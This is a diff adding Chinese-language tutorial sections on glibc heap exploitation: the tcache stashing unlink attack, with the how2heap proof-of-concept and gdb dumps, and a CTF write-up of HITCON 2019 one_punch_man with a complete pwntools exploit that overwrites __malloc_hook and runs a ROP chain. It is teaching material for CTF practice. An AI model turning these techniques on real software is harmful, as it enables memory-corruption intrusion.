@@ -1035,7 +1035,155 @@ Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就�
 
 在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。
 
+#### tcache stashing unlink attack
 
+这种攻击利用的是tcache bin有剩余(数量小于`TCACHE_MAX_BINS`)时，同大小的small bin会放进tcache中(这种情况可以用`calloc`分配同大小堆块触发，因为`calloc`分配堆块时不从tcache bin中选取)。在获取到一个`smallbin`中的一个chunk后会如果tcache仍有足够空闲位置，会将剩余的small bin链入tcache，在这个过程中只对一个bin进行了完整性检查，后面的堆块的检查缺失。，当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址(类似`unsorted bin attack`的效果)。构造得当的情况下也可以分配fake chunk到任意地址。
+
+这里以`how2heap`中的`tcache_stashing_unlink_attack.c`为例。
+
+我们按照释放的先后顺序称`smallbin[sz]`中的两个chunk分别为chunk0和chunk1。我们修改chunk1的`bk`为`fake_chunk_addr`。同时还要在`fake_chunk_addr->bk`处提前写一个可写地址`writable_addr`。调用`calloc(size-0x10)`的时候会返回给用户chunk0(这是因为smallbin的`FIFO`分配机制)，假设`tcache[sz]`中有5个空闲堆块，则有足够的位置容纳`chunk1`以及`fake_chunk`。在源码的检查中，只对第一个chunk的链表完整性做了检测`__glibc_unlikely (bck->fd != victim)`，后续堆块在放入过程中并没有检测。
+
+因为tcache的分配机制是`LIFO`，所以位于`fake_chunk->bk`指针处的`fake_chunk`在链入tcache的时候反而会放到链表表头。在下一次调用`malloc(sz-0x10)`时会返回`fake_chunk+0x10`给用户，同时，由于`bin->bk = bck;bck->fd = bin;`的unlink操作，会使得`writable_addr+0x10`处被写入一个libc地址。
+
+```c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    unsigned long stack_var[0x10] = {0};
+    unsigned long *chunk_lis[0x10] = {0};
+    unsigned long *target;
+
+    fprintf(stderr, "This file demonstrates the stashing unlink attack on tcache.\n\n");
+    fprintf(stderr, "This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
+    fprintf(stderr, "This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
+    fprintf(stderr, "The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
+    fprintf(stderr, "This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");
+
+    // stack_var emulate the fake_chunk we want to alloc to
+    fprintf(stderr, "Stack_var emulates the fake chunk we want to alloc to.\n\n");
+    fprintf(stderr, "First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");
+
+    stack_var[3] = (unsigned long)(&stack_var[2]);
+
+    fprintf(stderr, "You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
+    fprintf(stderr, "Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
+    fprintf(stderr, "Now we alloc 9 chunks with malloc.\n\n");
+
+    //now we malloc 9 chunks
+    for(int i = 0;i < 9;i++){
+        chunk_lis[i] = (unsigned long*)malloc(0x90);
+    }
+
+    //put 7 tcache
+    fprintf(stderr, "Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");
+
+    for(int i = 3;i < 9;i++){
+        free(chunk_lis[i]);
+    }
+
+    fprintf(stderr, "As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");
+
+    //last tcache bin
+    free(chunk_lis[1]);
+    //now they are put into unsorted bin
+    free(chunk_lis[0]);
+    free(chunk_lis[2]);
+
+    //convert into small bin
+    fprintf(stderr, "Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");
+
+    malloc(0xa0);//>0x90
+
+    //now 5 tcache bins
+    fprintf(stderr, "Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");
+
+    malloc(0x90);
+    malloc(0x90);
+
+    fprintf(stderr, "Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);
+
+    //change victim->bck
+    /*VULNERABILITY*/
+    chunk_lis[2][1] = (unsigned long)stack_var;
+    /*VULNERABILITY*/
+
+    //trigger the attack
+    fprintf(stderr, "Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");
+
+    calloc(1,0x90);
+
+    fprintf(stderr, "Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);
+
+    //malloc and return our fake chunk on stack
+    target = malloc(0x90);   
+
+    fprintf(stderr, "As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);
+    return 0;
+}
+```
+
+在这个poc中模拟栈上的一个数组为`fake_chunk`。首先构造出5个`tcache chunk`和2个`smallbin chunk`的情况。模拟`UAF`漏洞修改`bin2->bk`为`fake_chunk`，在`calloc(0x90)`的时候触发攻击。
+
+我们在`calloc`处下断点，调用前查看堆块排布情况。此时`tcache[0xa0]`中有5个空闲块。可以看到chunk1->bk已经被改为了`fake_chunk_addr`。而`fake_chunk->bk`也写上了一个可写地址。由于`smallbin`是按照`bk`指针寻块的，分配得到的顺序应当是`0x0000000000603250->0x0000000000603390->0x00007fffffffdbc0`(FIFO)。调用calloc会返回给用户`0x0000000000603250+0x10`。
+
+```bash
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x6038a0 (size : 0x20760) 
+       last_remainder: 0x0 (size : 0x0) 
+            unsortbin: 0x0
+(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)
+(0xa0)   tcache_entry[8](5): 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
+gdb-peda$ x/4gx 0x603390
+0x603390:       0x0000000000000000      0x00000000000000a1
+0x6033a0:       0x0000000000603250      0x00007fffffffdbc0
+gdb-peda$ x/4gx 0x00007fffffffdbc0
+0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
+0x7fffffffdbd0: 0x0000000000000000      0x00007fffffffdbd0
+gdb-peda$ x/4gx 0x0000000000603250
+0x603250:       0x0000000000000000      0x00000000000000a1
+0x603260:       0x00007ffff7dcfd30      0x0000000000603390
+gdb-peda$ x/4gx 0x00007ffff7dcfd30
+0x7ffff7dcfd30 <main_arena+240>:        0x00007ffff7dcfd20      0x00007ffff7dcfd20
+0x7ffff7dcfd40 <main_arena+256>:        0x0000000000603390      0x0000000000603250
+```
+
+调用calloc后再查看堆块排布情况，可以看到`fake_chunk`已经被链入`tcache_entry[8]`,且因为分配顺序变成了`LIFO`,`0x7fffffffdbd0-0x10`这个块被提到了链表头，下次`malloc(0x90)`即可获得这个块。
+
+其fd指向下一个空闲块，在unlink过程中`bck->fd=bin`的赋值操作使得`0x00007fffffffdbd0+0x10`处写入了一个libc地址。
+
+```bash
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x6038a0 (size : 0x20760) 
+       last_remainder: 0x0 (size : 0x0) 
+            unsortbin: 0x0
+(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)
+(0xa0)   tcache_entry[8](7): 0x7fffffffdbd0 --> 0x6033a0 --> 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
+gdb-peda$ x/4gx 0x7fffffffdbd0
+0x7fffffffdbd0: 0x00000000006033a0      0x00007fffffffdbd0
+0x7fffffffdbe0: 0x00007ffff7dcfd30      0x0000000000000000
+```
 
 ####  libc leak
 
@@ -2005,7 +2153,307 @@ if __name__ == "__main__":
     main(binary, "")
 ```
 
+#### Challenge 4 : HITCON 2019 one_punch_man
+
+##### 基本信息
+
+开启了常见保护，题目环境为glibc 2.29，使用seccomp开启了沙箱，只有白名单上的系统调用可以使用。
+
+```bash
+╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
+╰─$ checksec ./one_punch
+[*] '/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
+╰─$ seccomp-tools dump ./one_punch
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
+ 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
+ 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
+ 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
+ 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0024: 0x06 0x00 0x00 0x00000000  return KILL
+
+```
+
+##### 基本功能
+
+Add函数可以分配`[0x80,0x400]`大小的堆块，分配的函数为`calloc`，输入数据首先存储到栈上，之后再使用`strncpy`拷贝到`bss`上的数组里。
+
+Delete函数`free`堆块之后未清空，造成`double free`和`UAF`
+
+```c
+void __fastcall Delete(__int64 a1, __int64 a2)
+{
+  unsigned int v2; // [rsp+Ch] [rbp-4h]
+
+  MyPuts("idx: ");
+  v2 = read_int();
+  if ( v2 > 2 )
+    error("invalid", a2);
+  free(*((void **)&unk_4040 + 2 * v2));
+}
+```
+后门函数可以调用`malloc`分配`0x217`大小的堆块，但是要要满足`*(_BYTE *)(qword_4030 + 0x20) > 6`，我们在`main`函数里可以看到这里被初始化为`heap_base+0x10`，对于glibc 2.29，这个位置对应存储的是`tcache_perthread_struct`的`0x220`大小的`tcache_bin`的数量，正常来说，如果我们想调用后门的功能，要让这个`count`为7，然而这也就意味着`0x217`再分配和释放都同`glibc 2.23`一样，我们无法通过`UAF`改chunk的`fd`来达到任意地址写的目的，因此我们要通过别的方式修改这个值。
+```c
+__int64 __fastcall Magic(__int64 a1, __int64 a2)
+{
+  void *buf; // [rsp+8h] [rbp-8h]
+
+  if ( *(_BYTE *)(qword_4030 + 0x20) <= 6 )
+    error("gg", a2);
+  buf = malloc(0x217uLL);
+  if ( !buf )
+    error("err", a2);
+  if ( read(0, buf, 0x217uLL) <= 0 )
+    error("io", buf);
+  puts("Serious Punch!!!");
+  puts(&unk_2128);
+  return puts(buf);
+}
+```
+Edit和Show函数分别可以对堆块内容进行编辑和输出。
+
+##### 利用思路
+
+由于glibc 2.29中新增了对于`unsorted bin`链表完整性检查，这使得`unsorted bin attack`完全失效，我们的目标是往一个地址中写入`large value`，这种情况下就可以选择`tcache stashing unlink attack`。
+
+首先我们可以通过UAF来泄露`heap`和`libc`地址。具体方式是分配并释放多个chunk使其进入`tcache`，通过`Show`函数可以输出`tcache bin`的`fd`值来泄露堆地址。释放某个`small bin size`范围内的chunk七个，在第八次释放时会先把释放的堆块放入`unsorted bin`。通过`Show`函数可以泄露出libc地址。
+
+我们首先通过`UAF`将`__malloc_hook`链入`tcache`备用。然后分配并释放六次`0x100`大小的chunk进入`tcache`。通过`unsorted bin`切割得到`last remainer`的方式得到两个大小为`0x100`的chunk。再分配一个超过0x100的块使其进入`small bin`。按照释放顺序我们称之为bin1和bin2。修改`bin2->bk`为`(heap_base+0x2f)-0x10`，调用`calloc(0xf0)`触发`small bin`放入`tcache`的处理逻辑，由于`tcache`中有6个块，因此循环处理只会进行一次，这样也避免了fake_chunk因bk处无可写地址作为下一个块进行unlink时`bck->fd=bin`带来的内存访问错误。最终改掉`heap_base+0x30`的值绕过检查。
+
+##### 利用步骤
+
+下面在调用calloc前下断点，可以看到此时`tcache[0x100]`有6个堆块，small bin的分配顺序为`0x000055555555c460->0x55555555cc80->0x000055555555901f`，在`calloc(0xf0)`调用后，`0x000055555555c460`会被返回给用户，`0x55555555cc80`被链入tcache，而由于没有多余位置，跳出循环，`0x000055555555901f`不做处理。
+
+```bash
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x55555555d9d0 (size : 0x1c630) 
+       last_remainder: 0x55555555cc80 (size : 0x100) 
+            unsortbin: 0x0
+(0x030)  smallbin[ 1]: 0x555555559ba0
+(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x100 and 0x55555555cc80 is broken)          
+(0x100)   tcache_entry[14](6): 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
+(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
+(0x220)   tcache_entry[32](1): 0x55555555d7c0 --> 0x7ffff7fb4c30
+(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
+gdb-peda$ x/4gx 0x55555555cc80
+0x55555555cc80: 0x0000000000000000      0x0000000000000101
+0x55555555cc90: 0x000055555555c460      0x000055555555901f
+gdb-peda$ x/4gx 0x000055555555c460
+0x55555555c460: 0x0000000000000000      0x0000000000000101
+0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
+gdb-peda$ x/4gx 0x00007ffff7fb4d90
+0x7ffff7fb4d90 <main_arena+336>:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
+0x7ffff7fb4da0 <main_arena+352>:        0x000055555555cc80      0x000055555555c460
+```
+calloc分配完成之后的结果和我们预期一致，`0x000055555555901f`作为`fake_chunk`其`fd`也被改写为了`libc`地址
+```bash
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x55555555d9d0 (size : 0x1c630) 
+       last_remainder: 0x55555555cc80 (size : 0x100) 
+            unsortbin: 0x0
+(0x030)  smallbin[ 1]: 0x555555559ba0
+(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x700 and 0x55555555cc80 is broken)          
+(0x100)   tcache_entry[14](7): 0x55555555cc90 --> 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
+(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
+(0x210)   tcache_entry[31](144): 0
+(0x220)   tcache_entry[32](77): 0x55555555d7c0 --> 0x7ffff7fb4c30
+(0x230)   tcache_entry[33](251): 0
+(0x240)   tcache_entry[34](247): 0
+(0x250)   tcache_entry[35](255): 0
+(0x260)   tcache_entry[36](127): 0
+(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
+gdb-peda$ x/4gx 0x000055555555901f+0x10
+0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
+0x55555555903f: 0x0000000000000000      0x0000000000000000
+```
+由于沙箱保护，我们无法执行`execve`函数调用，只能通过`open/read/write`来读取flag。我们选择通过调用后门函数修改`__malloc_hook`为`gadget(mov eax, esi ; add rsp, 0x48 ; ret)`，以便add的时候将`rsp`改到可控的输入区域调用`rop chains`来`orw`读取`flag`。
+
+完整exp如下：
+
+```python
+#coding=utf-8
+from pwn import *
+context.update(arch='amd64',os='linux',log_level='DEBUG')
+context.terminal = ['tmux','split','-h']
+debug = 1
+elf = ELF('./one_punch')
+libc_offset = 0x3c4b20
+gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
+if debug:
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    p = process('./one_punch')
+
+def Add(idx,name):
+    p.recvuntil('> ')
+    p.sendline('1')
+    p.recvuntil("idx: ")
+    p.sendline(str(idx))
+    p.recvuntil("hero name: ")
+    p.send(name)
+
+
+def Edit(idx,name):
+    p.recvuntil('> ')
+    p.sendline('2')
+    p.recvuntil("idx: ")
+    p.sendline(str(idx))
+    p.recvuntil("hero name: ")
+    p.send(name)
+
+def Show(idx):
+    p.recvuntil('> ')
+    p.sendline('3')
+    p.recvuntil("idx: ")
+    p.sendline(str(idx))
+
+def Delete(idx):
+    p.recvuntil('> ')
+    p.sendline('4')
+    p.recvuntil("idx: ")
+    p.sendline(str(idx))
+
+def BackDoor(buf):
+    p.recvuntil('> ')
+    p.sendline('50056')
+    sleep(0.1)
+    p.send(buf)
+
+def exp():
+    #leak heap
+    for i in range(7):
+        Add(0,'a'*0x120)
+        Delete(0)
+    Show(0)
+    p.recvuntil("hero name: ")
+    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
+    log.success("[+]heap base => "+ hex(heap_base))
+    #leak libc
+    Add(0,'a'*0x120)
+    Add(1,'a'*0x400)
+    Delete(0)
+    Show(0)
+    p.recvuntil("hero name: ")
+    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
+    log.success("[+]libc base => " + hex(libc_base))
+    #
+    for i in range(6):
+        Add(0,'a'*0xf0)
+        Delete(0)
+    for i in range(7):
+        Add(0,'a'*0x400)
+        Delete(0)
+    Add(0,'a'*0x400)
+    Add(1,'a'*0x400)
+    Add(1,'a'*0x400)
+    Add(2,'a'*0x400)
+    Delete(0)#UAF
+    Add(2,'a'*0x300)
+    Add(2,'a'*0x300)
+    #agagin
+    Delete(1)#UAF
+    Add(2,'a'*0x300)
+    Add(2,'a'*0x300)
+    Edit(2,'./flag'.ljust(8,'\x00'))
+    Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))
+
+    #trigger
+    Add(0,'a'*0x217)
+
+    Delete(0)
+    Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
+    #gdb.attach(p,'b calloc')
+    Add(0,'a'*0xf0)
+
+    BackDoor('a')
+    #mov eax, esi ; add rsp, 0x48 ; ret
+    #magic_gadget = libc_base + libc.sym['setcontext']+53
+    # add rsp, 0x48 ; ret
+    magic_gadget = libc_base + 0x000000000008cfd6
+    payload = p64(magic_gadget)
+
+    BackDoor(payload)
+
+    p_rdi = libc_base + 0x0000000000026542
+    p_rsi = libc_base + 0x0000000000026f9e
+    p_rdx = libc_base + 0x000000000012bda6
+    p_rax = libc_base + 0x0000000000047cf8
+    syscall = libc_base + 0x00000000000cf6c5
+    rop_heap = heap_base + 0x44b0
+
+    rops = p64(p_rdi)+p64(rop_heap)
+    rops += p64(p_rsi)+p64(0)
+    rops += p64(p_rdx)+p64(0)
+    rops += p64(p_rax)+p64(2)
+    rops += p64(syscall)
+    #rops += p64(libc.sym['open'])
+    #read
+    rops += p64(p_rdi)+p64(3)
+    rops += p64(p_rsi)+p64(heap_base+0x260)
+    rops += p64(p_rdx)+p64(0x70)
+    rops += p64(p_rax)+p64(0)
+    rops += p64(syscall)
+    #rops += p64(libc.sym['read'])
+    #write
+    rops += p64(p_rdi)+p64(1)
+    rops += p64(p_rsi)+p64(heap_base+0x260)
+    rops += p64(p_rdx)+p64(0x70)
+    rops += p64(p_rax)+p64(1)
+    rops += p64(syscall)
+    Add(0,rops)
+    p.interactive('$ xmzyshypnc')
+
+exp()
+```
+
 ### 0x06 建议习题：
 
 * 2018 HITCON children_tcache
 * 2018 BCTF houseOfAtum
+* 2019 HTICON Lazy House
+* 2020 XCTF no-Cov twochunk
